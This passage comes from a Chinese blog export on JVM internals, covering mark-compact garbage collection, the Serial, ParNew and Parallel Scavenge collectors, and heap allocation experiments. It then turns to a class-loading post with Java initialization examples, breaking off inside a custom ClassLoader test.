     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/**
         * 上述代码一开始就被分配了80m的大对象，所以这个对象会直接进入老年代占据80m空间，
         * 那老年代就只剩20m空间了。肯定不够分配新生代GC后的存活下来的25m对象，就会触发full gc。
         */</span>
        <span class="token function">loadData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    上面测试的结论是：<code>新生代gc后，如果触发了老年代gc，即使survivor区放的下部分存活对象，对象也会全部进入老年代。</code></p>
<h3 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h3><p>​    现在我们是针对的<code>老年代</code>对象的存亡特征，其中标记的过程仍然是”标记-清除”，但后续不是直接清除可回收对象，而是让所有存活对象都向内存空间一端移动，然后直接清理掉边界值以外的内存，这样也不用担心空间碎片的问题了。但是缺点也很明显，老年代中大部分都向都是存活的，如果移动并更新引用它们的地方，也是非常负重的操作。而且必须暂停所有的用户应用程序才能进行。</p>
<p>​    所以如果是使用标记-清除算法，内存分配会很复杂，使用标记-整理算法，内存回收时很复杂。Hotspot虚拟机里面关注吞吐量的<code>Parallel Old收集器</code>基于标记-整理算法的，关注延迟的<code>CMS收集器</code>是基于标记-清除的。具体详细内容可以去深入了解。</p>
<p>​    还有一种和稀泥的方法，前面一直使用标记-清理算法，暂时容忍空间碎片，当影响到对象分配时，再进行标记-整理算法。前面提到的<code>CMS收集器</code>遇到碎片过多时，采用的就是这个方式。</p>
<hr>
<h2 id="经典垃圾收集器"><a href="#经典垃圾收集器" class="headerlink" title="经典垃圾收集器"></a>经典垃圾收集器</h2><p>​    如果说垃圾收集算法是内存回收的方法论，那垃圾回收器就是内存回收的实践者，在《Java虚拟机规范》并未声明垃圾收集器规定，所以各个厂商，不同版本的垃圾收集器都会有一些差别，不同的虚拟机也会提供不同的参数来选择适合自己场景的收集器。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heftlrvrj30j60eqt9h.jpg" alt="image-20220628151229971"></p>
<p>​    上图为各个收集器直接可行的匹配关系。</p>
<h3 id="Serial-收集器"><a href="#Serial-收集器" class="headerlink" title="Serial 收集器"></a>Serial 收集器</h3><p>​    它是最基础的，最早的收集器，基于<code>标记复制</code>算法实现，特点：<code>单线程，当进行垃圾收集的时候，必须暂停其他所有工作线程，直到收集完毕，Stop The World</code>。对于大部分人来说是不可接受的，好比你每运行一小时，都得暂停是十五分钟。</p>
<p>​    但注意的是它依然是HotSpot虚拟机运行在客户端的默认新生代收集器，它的优点就是简单且高效，对于内存资源受限制的环境，它是所有收集器中额外内存消耗最小的，对于单核处理或者处理器较少时，Serial就很高效，没有线程交互的开销。</p>
<h3 id="ParNew-收集器"><a href="#ParNew-收集器" class="headerlink" title="ParNew 收集器"></a>ParNew 收集器</h3><p>​    相当于是一个Serial多线程并行版本，基于<code>标记复制</code>算法实现，其实性能一般，只不过是后来出现的CMS收集器只能个Serial和ParNew收集器配合使用，CMS收集器的一个特点就是首次实现垃圾收集线程和用户线程（基本上）同时工作。</p>
<p>​    但是后来又出现了G1收集器，G1收集器是一个面向全堆的收集器，所以ParNew就算是退休了，不过当随着可以被使用的处理器核数的增加，效率也会优化。</p>
<h3 id="Parallel-Scavenge-收集器"><a href="#Parallel-Scavenge-收集器" class="headerlink" title="Parallel Scavenge 收集器"></a>Parallel Scavenge 收集器</h3><p>​    一款新生代收集器，基于<code>标记-复制</code>算法实现的收集器，也是一个多线程收集器，那我们为啥使用它？</p>
<blockquote>
<p>是因为该收集器的特点是与其他收集器关注点不同</p>
</blockquote>
<p>​    CMS收集器的关注点是尽可能的缩短垃圾回收时，用户线程停顿的时间，而Parallel Scavenge关注的是吞吐量</p>
<p>$$ 吞吐量 = {用户代码运行时间 \over 用户代码运行时间+运行垃圾收集时间} $$</p>
<p>​    举个例子，如果代码运行+运行垃圾收集时间用了100分钟，其中垃圾收集用了一分钟，那吞吐量就是99%。主要适合于后台运算而不需要太多交互的分析任务。所以它也被称为<code>吞吐量优先收集器</code>。</p>
<p>​    可通过<code>-XXLMaxGCPauseMilis</code>来控制最大垃圾收集时间，也可通过<code>-XX:GCTimeRatio</code>参数设置吞吐量大小。还有一个重要参数<code>-XX:+UseAdaptiveSizePolicy</code>，它是一个开关，用了我们就不用自己设定新生代各个区域划分问题，虚拟机会自己收集信息，来动态调整最合适的划分，被称为：<code>垃圾收集的自适应的调节策略</code>。</p>
<hr>
<h2 id="实战：内存分配与回收策略"><a href="#实战：内存分配与回收策略" class="headerlink" title="实战：内存分配与回收策略"></a>实战：内存分配与回收策略</h2><p>​    Java技术体系的自动内存管理，最核心的目标就是自动化的解决两个问题：<code>内存分配</code>和<code>内存回收</code>，在之前我们讲的都是内存回收，现在我们来看一下内存分配的细节，这里我是使用JDK1.8，HotSpot虚拟机，使用的<code>ParallelGC</code></p>
<blockquote>
<p>这里有一个很细的点：《深入理解Java虚拟机》使用的<code>Serial+Serial Old</code>客户端默认收集器组合下的内存分配和回收策略，但咱们的jvm是服务端的，说是只能在32位机<code>jvm.cfg</code>修改文件使用客户端，所以当我运行书上第一个代码块儿时，就发现结果与书上不对，想不出原因，所以如果你也是ParallelGC，那么书本上本章上许多代码结果都是不一样的。一些VM参数也是无法使用的或者没有效果的。</p>
<ol>
<li>java -XX:+PrintCommandLineFlags -version    输出JVM默认垃圾收集器,第四行的<code>UseParallelGC</code>和最后一行的<code>Server VM</code></li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token punctuation">[</span>root<span class="token annotation punctuation">@jeespring</span> <span class="token operator">~</span><span class="token punctuation">]</span># java <span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token operator">+</span><span class="token class-name">PrintCommandLineFlags</span> <span class="token operator">-</span>version
<span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token class-name">InitialHeapSize</span><span class="token operator">=</span><span class="token number">132500800</span> <span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token class-name">MaxHeapSize</span><span class="token operator">=</span><span class="token number">2120012800</span> <span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token operator">+</span><span class="token class-name">PrintCommandLineFlags</span> 
<span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token operator">+</span><span class="token class-name">UseCompressedClassPointers</span> <span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token operator">+</span><span class="token class-name">UseCompressedOops</span> <span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token operator">-</span><span class="token class-name">UseLargePagesIndividualAllocation</span> <span class="token operator">-</span><span class="token constant">XX</span><span class="token operator">:</span><span class="token operator">+</span><span class="token class-name">UseParallelGC</span>
java version <span class="token string">"1.8.0_211"</span>
<span class="token class-name">Java</span><span class="token punctuation">(</span><span class="token constant">TM</span><span class="token punctuation">)</span> <span class="token constant">SE</span> <span class="token class-name">Runtime</span> <span class="token class-name">Environment</span> <span class="token punctuation">(</span>build <span class="token number">1.8</span><span class="token number">.0_211</span><span class="token operator">-</span>b12<span class="token punctuation">)</span>
<span class="token class-name">Java</span> <span class="token class-name">HotSpot</span><span class="token punctuation">(</span><span class="token constant">TM</span><span class="token punctuation">)</span> <span class="token number">64</span><span class="token operator">-</span><span class="token class-name">Bit</span> <span class="token class-name">Server</span> <span class="token constant">VM</span> <span class="token punctuation">(</span>build <span class="token number">25.211</span><span class="token operator">-</span>b12<span class="token punctuation">,</span> mixed mode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>/usr/libexec/java_home -V   这个是在mac上找我的jvm在哪</li>
<li>find . -name “jvm.cfg”   如果你找不到jvm.cfg，通过它去找,表示在当前路径下找</li>
<li>JVM的Server端和Client端区别网上有详细介绍，通俗的讲就是Client端轻量快速，Server端重量性能好（默认）。</li>
</ol>
</blockquote>
<blockquote>
<p>对象的内存分配从概念上来讲，应该是在堆上分配，不过实际中也可能通过即时编译后拆分为标量间接存储在栈上（这个在我之前写的<code>逃逸分析</code>中有说明）</p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefveh9mj30g10bbq3f.jpg" alt="image-20220627093330808"></p>
<pre><code>### 对象优先在Eden分配（书本原题目）
</code></pre>
<ol>
<li>Serial：当大对象要分配内存时，发现Eden区已经满了，而且Survivor区也不够，会将Eden区原来的对象直接放入老年代，再把新的对象放入Eden区。</li>
<li>Parallel（我测试的）：发现Eden区满了，Survivor区不够，会直接把大对象放到老年代，Eden区对象不变。读者可以自己再测试一遍</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 对象分配
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> no1 <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> _1MB  <span class="token operator">=</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * VM: -Xms20M -Xmx20M -Xmn10M -XX:SurvivorRatio=8  -XX:+PrintGCDetails
     * 堆空间分配20m，新生代10m，新生代中的Eden和Survivor为8：1：1
     * @param args
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">,</span>a3<span class="token punctuation">,</span>a4<span class="token punctuation">;</span>
        a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>_1MB<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>_1MB<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>_1MB<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">/**
         * 上面已经创建了8m，相当于Eden区已经满了，现在我们再放一个4M的对象
         * Eden已经放不下了，会启动一次MinorGC，我们看一下会之前的对象和新来的对象如何分配
         * 
         *  PSYoungGen      total 9216K, used 8001K
         *      eden space 8192K, 97% used
         *      from space 1024K, 0% used
         *  ParOldGen       total 10240K, used 4096K
         */</span>
        a4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>_1MB<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="大对象直接进入老年代"><a href="#大对象直接进入老年代" class="headerlink" title="大对象直接进入老年代"></a>大对象直接进入老年代</h3><p>​    我们知道一般对象不会直接到老年区，得现在Eden区和Survivor区熬几轮，但如果有大的对象已经在里面了，那么就很容易触犯minor GC，导致对象进行标记-复制，所以可以可以通过设置<code>XX:PretenureSizeThreshold</code>来指定超过多大的对象直接去了老年区（注意这个参数Parallel无法使用）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 对象分配
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> no1 <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> _1MB  <span class="token operator">=</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * VM:  -Xms20M -Xmx20M -Xmn10M -XX:SurvivorRatio=8  -XX:+PrintGCDetails -XX:PretenureSizeThreshold=3145728
     * 堆空间分配20m，新生代10m，新生代中的Eden和Survivor为8：1：1
     * -XX:PretenureSizeThreshold 表示 需要分配的对象只要大于3M，就直接分配到老年区，注意：这个参数只能Serial使用，ParallelGC无法使用
     * @param args
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a4<span class="token punctuation">;</span>
        a4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>_1MB<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="长期存活的对象进入老年代"><a href="#长期存活的对象进入老年代" class="headerlink" title="长期存活的对象进入老年代"></a>长期存活的对象进入老年代</h3><p>​    意思就是我们给每个对象定义一个对象年龄计数器，存储在对象头中，每经历一次Minor GC后存活，并可以存储到Survivor区时，年龄就+1，当长到系统<code>-MaxTenuringThreshold</code>设定值时（默认值15），就去老年代.</p>
<h3 id="动态对象年龄判定"><a href="#动态对象年龄判定" class="headerlink" title="动态对象年龄判定"></a>动态对象年龄判定</h3><p>​    这里就是说系统可以动态判断，如果每个对象都得等15轮minor GC，那就会导致频繁的GC，影响性能，如果Survivor区中对低于或者等于某个年龄的对象总和超过了Survivor空间的一半，那这个年龄及其以上的对象直接进入老年区。</p>
<h3 id="空间分配担保"><a href="#空间分配担保" class="headerlink" title="空间分配担保"></a>空间分配担保</h3><p>​    我们在前面就提到，其实老年代就是新生代的担保人，如果新生代放不下的对象，我就把对象放到老年代。根据这第一点我们就可以推断出每次<code>Minor GC</code>前，虚拟机都应检查老年代最大的连续空间是否有足够的空间装下新生代所有对象，如果空间足够，那我们就放心的Minor GC，如果不够了，虚拟机去查看<code>-XX:HandlePromotionFailur</code>参数是否允许担保失败，如果允许，继续检查老年代之前进来对象的平均大小是否小于老年代最大连续空间（简单来说：通过以前来的，猜测后面来的应该差不多大），如果足够，进行Minor GC，虽然有风险，如果不够，或者是没有担保，则直接<code>Full GC</code>,这就很影响性能了。所以一般都会将<code>-XX:HandlePromotionFailur</code>打开，来避免频繁的FUll GC。这个参数在JDK6 Update24后就不再使用了。</p>
<p>​    也就是现在只要老年代的连续空间大于新生代对象总大小或者以往对象的平均值大小，就会进行Minor GC，否则将进行Full GC。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    垃圾收集器在许多场景都是影响系统停顿时间和吞吐能力的重要因素，虚拟机之所以提供各种不同的收集器和大量的调节参数就是因为各种有各种的适用场景，需要我们不断探索，不断组合。当然我们也需要知道每种收集器的特点以及范围。</p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>垃圾回收</tag>
        <tag>内存分配</tag>
      </tags>
  </entry>
  <entry>
    <title>类加载机制</title>
    <url>//post/JVM/7_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.html</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote>
<p>虚拟机是如何加载Class文件的？</p>
<p>Class文件进入虚拟机后会有什么变化？</p>
</blockquote>
<p>​        在Java中我们知道有编译期和运行期，其中编译期为我们写的java代码通过javac编译成一个一个的class文件，而运行期则为将class文件通过jvm加载到内存中，通过一些列操作变成可以jvm直接使用的Java类型。这为Java带来了极高的扩展性和灵活性，例如动态链接和到动态加载，具体下来可用面向接口编程和一系列设计模式进行举例。</p>
<h2 id="类的加载时机"><a href="#类的加载时机" class="headerlink" title="类的加载时机"></a>类的加载时机</h2><p>​        一个类型从加载到jvm内存中开始，到卸载出内存为止，整个生命周期经历了：</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heg77pblj30vo0fydhc.jpg" alt="image-20220611192459719"></p>
<p>​        其中加载，验证，准备，初始化是按部就班的开始的，解析则不一定，一些情况中解析是在初始化后的，而这也是为了支持java的运行时绑定特性。</p>
<p>​        一般类的加载在《java虚拟机规范》中并没有强制要求，根据具体的虚拟机实现完成，而类的初始化则严格按照规定，有且只有六中情况，必须对类进行初始化，而前面的步骤自然也要提前完成。</p>
<ol>
<li>遇到new,getstatic,putstatic,invokestatic 这四条字节码指令时，如果当前系统中还没加载这个类，则必须对其进行初始化。其中具体场景有：<ol>
<li>通过new关键字创建实例时，对类进行初始化：<code>new Object()</code>。</li>
<li>读取或设置一个类型的静态字段（static final 不算，因为在编译期间就把结果放在了常量池中，读取数据时，不需要初始化该类）：<code>read(object.Field)</code></li>
<li>调用一个类的静态方法。<code>object.Field()</code></li>
</ol>
</li>
<li>使用reflect包进行反射时，对类进行初始化。<code>Class.forName(class_reference_name)</code></li>
<li>在该类初始化时发现其父类还没有初始化，则先将其父类进行初始化，再初始化当前类</li>
<li>当虚拟机启动时，用户需要执行一个主类（<code>执行main()方法的类</code>），虚拟机会先初始化这个类</li>
<li>jdk7新加入的动态语言支持时，如果有一个java.long.invoke.MethodHandle实例最后解析为REF_getStatus,REF_putStatus,REF_invokeStatic,REF_newInvokeSpecial四种类型的方法句柄，当这个方法句柄的类没有初始化时，则需要先初始化。</li>
<li>当一个接口中定义了JDK8新加入的默认方法，(被default关键字修饰的接口方法)时，该类的实现类发生初始化时，需要先对其接口初始化</li>
</ol>
<p>​        这6方法为有且仅有的使触发类型进行初始化的场景，也被称为主动引用，其他引用方式的类型都不会触发初始化了，也被称为被动引用。下面举几个例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">SuperClass</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"this is SuperClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">static</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">SubClass</span> <span class="token keyword">extends</span> <span class="token class-name">SuperClass</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"this is SubClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">NotInitialization</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
        通过-XX:+TraceClassLoading可以查看类的加载情况
        可以发现三个类的被加载了，但是SubClass类并没有初始化，也就是其中的static静态代码块并没执行
        而这里我们通过子类去调用父类的静态变量，则只是初始化父类信息
        
        运行结果：
        this is SuperClass
        10
         */</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">SubClass</span><span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">NotInitialization</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//这里我们可以发现，在创建类型数组时，也只是对该类型进行加载，而没有初始化</span>
        <span class="token class-name">SuperClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">NotInitialization</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/**
         * 我们可发现这里也没有打印静态代码块内容i，连ConstClass类都没有加载
         * 这是因为ConstClass.i 在编译期间通过常量的传播优化，已经将该值传入到
         * NotInitialization类的常量池中，这时候对ConstClass.i的引用就变成了对自身常量池的引用
         */</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">ConstClass</span><span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ConstClass</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"this is ConstClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span>  <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        而接口的加载与类的加载有一些不同，接口也有初始化的过程，与类一致，但是没有static静态代码块，编译器仍会为接口生成“<clinit>”类构造器，用来初始化接口中定义的成员变量，而接口与类的真正区别在于，类的初始化之前会将父类都进行初始化，而接口在初始化时，并不要求父接口都完成初始化，只有在真正使用父接口时（如引用接口中的常量）才会初始化。</p>
<h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>​        在加载阶段，java虚拟机需要完成以下三件事</p>
<ol>
<li>通过一个类的全限定名来获取定义此类的二进制字节流</li>
<li>将这个字节流代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在内存中生成一个代表这个类的java.long.Class对象，作为方法区这个类的各种数据的访问入口</li>
</ol>
<blockquote>
<p>《java虚拟机规范》对这三点要求并不是很具体，供开发人员操作的空间很大</p>
</blockquote>
<blockquote>
<p>就比如说获取二进制字节流的方式就有很多</p>
<ol>
<li>从ZIP压缩包获取，常见的JAR包，WAR包</li>
<li>从网络中获取，常见的有Web Applet</li>
<li>运行时计算生成，动态代理技术</li>
<li>从其他文件生成，JSP文件生成对应的Class文件</li>
<li>。。。</li>
</ol>
</blockquote>
<p>​        相对于类加载过程的其他阶段，非数组类型的加载阶段（准确来说是加载阶段中获取类的二进制字节流的动作）是开发者可控性最高的阶段，加载阶段既可以使用java虚拟机内置的启动类加载器来完成。也可以由用户定义的类加载器完成。</p>
<p>​        对于数组类而言，情况也有所不同，数组类本身不通过类加载器创建，是由Java虚拟机在内存中动态构造出来的，但数组类与类加载仍有很大关系，因为里面的元素还是要靠类加载器完成加载。一个数组类在创建中遵守以下几个规则。</p>
<ol>
<li>如果数组类的元素为引用型数据，就递归采用原先定义好的类加载过程去加载组件，数组类将被标记在加载该组件类型的类加载器的类名称空间上。（！！！一个类型必须与类加载器一起确定唯一性）</li>
<li>如果数组类元素不是引用型（例如<code>int[]</code>）Java虚拟机将会把数组类标记为与启动类加载器关联。</li>
<li>数组类的可访问性与他的组件类型的可访问性一致，如果组件类型不是引用类型，他的数组类的可访问性将默认为public，可被所有的类和接口访问到。</li>
</ol>
<p>​        加载阶段结束后，Java虚拟机外部的二进字节流就按照虚拟机所设定的格式存储在<code>方法区</code>之中，类型数据妥善安置在方法区之后，会在Java<code>堆内存</code>中实例化一个<code>java.lang.Class</code>类的对象，这个对象将作为程序访问方法区中类型数据的<code>外部接口</code></p>
<p>​        加载阶段与连接阶段的部分动作是交叉进行的，加载阶段尚未完成，连接阶段可能就已经开始。</p>
<h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>​        对于任何一个类，<strong>都需要它的类加载器与类本身共同确定在虚拟机中的唯一性</strong>，每个类加载器都有自己的名称空间，通俗来说判断两个类是否相等，前提条件就是是否是同一个类加载器加载的，换句话说：即使是同一个Class文件源，通过不同的类加载器，两个类也就势必不同。</p>
<blockquote>
<p>代码测试</p>
<p>这个案例中我们可以看到我们自己定义了一个类记载器，然后来加载当前这个类，并输出实例对象，都没有问题，但最后使用instance时做类型判定时发现输出为false。</p>
<p>这是因为我们在类的初始化中所述，当java含有main方法的启动类执行时，会默认进行类的初始化，这个时候它是由系统默认的类加载器，而当我们在main方法中创建了一个类加载器时并加载该类，在虚拟机中创建的完全就是不同的类了。</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>fenixsoft<span class="token punctuation">.</span>classloading</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderTest</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">//org.fenixsoft.classloading.ClassLoaderTest@47089e5f</span>
    <span class="token comment">//false</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassLoader</span> myloader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
